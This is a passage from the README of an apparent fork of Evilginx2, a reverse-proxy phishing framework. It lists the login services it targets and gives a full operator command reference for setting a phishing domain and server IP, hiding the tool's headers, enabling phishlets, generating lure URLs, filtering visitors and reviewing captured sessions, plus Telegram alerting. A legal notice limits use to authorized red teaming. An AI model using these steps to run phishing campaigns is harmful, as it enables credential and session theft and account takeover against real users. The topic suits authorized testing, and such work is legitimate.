| 🔵 **Business** | `dropbox`, `box`, `salesforce`, `zendesk`, `atlassian`, `slack`, `confluence` |
| 🟢 **Enterprise** | `okta`, `onelogin`, `duosecurity`, `pingidentity`, `adfs` |
| 🔵 **E-Commerce** | `amazon`, `shopify`, `paypal`, `stripe`, `etsy`, `ebay` |
| 🟢 **Other** | `yahoo`, `protonmail`, `aol`, `icloud`, `custom` |

---

<br>

# 📋 COMMANDS REFERENCE

### Core Configuration

```
config domain example.com                    Set your phishing domain
config ipv4 external 1.2.3.4                Set your VPS IP
config ipv4 bind 0.0.0.0                    Set bind address
config autocert on                           Enable auto SSL certs
config unauth_url https://www.google.com      Unauthorized redirect
config strip_headers on                       Hide Evilginx headers
```

### Telegram

```
config teletoken 123456:ABC-DEF...            Set bot token
config chatid 123456789                       Set chat ID
test telegram                                 Test notifications
```

### Phishlet Management

```
phishlets hostname office365 example.com      Set hostname
phishlets enable office365                    Enable phishlet
phishlets disable office365                   Disable phishlet
phishlets hide office365                      Hide (block all traffic)
phishlets unhide office365                    Unhide
phishlets list                                List all phishlets
```

### Lure Management

```
lures create office365                        Create new lure
lures get-url 0                               Get phishing URL
lures list                                    List all lures
lures delete 0                                Delete lure
lures edit 0                                  Edit lure
lures pause 0                                 Pause lure
lures unpause 0                               Unpause lure
```

### Blacklist

```
blacklist all                                 Block all non-whitelisted
blacklist unauth                              Block unauthorized only
blacklist noadd                               Redirect without adding
blacklist off                                 Disable blacklist
```

### System

```
sessions                                      List active sessions
sessions <id>                                 Show session detail
sessions delete <id>                          Delete session
config                                        Show current config
test-certs                                    Test SSL certificates
clear                                         Clear screen
help                                          Show all commands
exit                                          Exit and save config
```

---

<br>

# 🤝 CONTRIBUTING

We welcome contributions from the community.

### How to Help

| Area | How To Contribute |
|:-----|:------------------|
| **Bug Reports** | Open an issue with steps to reproduce, expected vs actual behavior, and relevant logs |
| **Feature Requests** | Open a discussion with a clear description and use case |
| **Phishlets** | Submit YAML phishlets via pull request |
| **Code** | Fork → feature branch → commit → pull request |
| **Documentation** | Improve DEPLOYMENT.md, README.md, or add wiki pages |
| **Testing** | Report edge cases, performance issues, or compatibility problems |

### Development Commands

```bash
make build          # Build production binary
make dev            # Build with debug symbols
make test           # Run test suite
make lint           # Run linter
make docker         # Build Docker image
make clean          # Clean build artifacts
```

---

<br>

# 👏 CREDITS

| Contribution | Author |
|:-------------|:-------|
| **Telegram Integration** | @officialmonsterz |
| **Web Dashboard** | @officialmonsterz |
| **GeoIP Engine** | @officialmonsterz |
| **Credential Validation** | @officialmonsterz |
| **CSS Randomization** | @officialmonsterz |
| **Extension Detection** | @officialmonsterz |
| **Header Stripping** | @officialmonsterz |
| **URL Rewriting** | @officialmonsterz |
| **Dynamic Content Spoofing** | @officialmonsterz |
| **Bot Protection (Enhanced)** | @officialmonsterz |
| **BuntDB Integration** | @officialmonsterz |
| **Wildcard SSL Support** | @officialmonsterz |
| **Auto-Export System** | @officialmonsterz |
| **Systemd Service** | @officialmonsterz |
| **Docker Build** | @officialmonsterz |
| **RID Replacement Scripts** | @officialmonsterz |
| **Original Evilginx2/3 Core** | **Kuba Gretzky (@kgretzky)** |

---

<br>

# ⚠️ LEGAL NOTICE

> **🚨 WARNING: READ THIS BEFORE USING 🚨**

This software is a **dual-use tool** designed exclusively for:

- ✅ **Authorized penetration testing** with written permission
- ✅ **Security research** in controlled laboratory environments
- ✅ **Red team engagements** under signed Rules of Engagement (RoE)
- ✅ **Educational purposes** in accredited cybersecurity programs

It is **NOT** for:

- ❌ Unauthorized access to any system you do not own
- ❌ Identity theft, credential harvesting, or fraud
- ❌ Any activity that violates applicable laws

### Legal Consequences of Misuse

| Jurisdiction | Law | Maximum Penalty |
|:-------------|:----|:----------------|
| **United States** | Computer Fraud and Abuse Act (CFAA) | Up to 20 years imprisonment + fines |
| **United Kingdom** | Computer Misuse Act 1990 | Up to 10 years imprisonment |
| **European Union** | GDPR + Cybercrime Directive | Up to 5 years + €20M fines |
| **Australia** | Criminal Code Act 1995 | Up to 10 years imprisonment |
| **Canada** | Criminal Code (S. 342.1, 430) | Up to 10 years imprisonment |
| **Singapore** | Computer Misuse Act | Up to 20 years + fines |

### Maintainer Position

The maintainers of this repository:

- ✅ **Support ethical security research** and authorized testing
- ❌ **Do NOT condone** any illegal use of this software
- ❌ **Will NOT provide support** for illegal activities
- ✅ **Will cooperate** with law enforcement in investigations
- ❌ **Accept NO liability** for misuse of this software

**By using this software, you acknowledge that:**

1. You have read and understood this legal notice
2. You will only use this software for lawful, authorized purposes
3. You accept full legal responsibility for your actions
4. You indemnify the maintainers from any liability arising from your use

---

<br>

<p align="center">
  <sub>Built with ☕, determination, and late nights by red teamers, for red teamers.</sub><br>
  <sub>Based on the pioneering work of <a href="https://github.com/kgretzky/evilginx2">Kuba Gretzky</a></sub><br>
  <sub>Licensed under <a href="LICENSE">BSD 3-Clause</a></sub>
</p>

<p align="center">
  <a href="https://github.com/officialmonsterz/evilginx2"><img src="https://img.shields.io/github/stars/officialmonsterz/evilginx2?style=social" alt="GitHub Stars"></a>
  <a href="https://github.com/officialmonsterz/evilginx2/issues"><img src="https://img.shields.io/github/issues/officialmonsterz/evilginx2?style=social" alt="GitHub Issues"></a>
</p>

---

<p align="center">
  <sub>🇿🇦 Proudly South African engineering.</sub>
</p>
